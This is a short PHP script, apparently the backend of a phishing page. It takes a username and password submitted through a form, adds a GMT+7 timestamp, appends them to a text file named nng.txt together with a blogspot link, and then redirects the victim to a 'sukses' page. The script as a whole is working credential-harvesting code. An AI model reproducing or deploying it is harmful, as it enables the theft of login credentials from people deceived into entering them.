<?php
$email=$_POST['uname'];
$pass=$_POST['pass'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);



$file=fopen('nng.txt',a);
$save=fwrite($file,'##############################
User : '.$email.'
Pass : '.$pass.'
'.$now.'
#####################
http://andi002.blogspot.com/

');
fclose($file);
header('location:sukses.html');


?>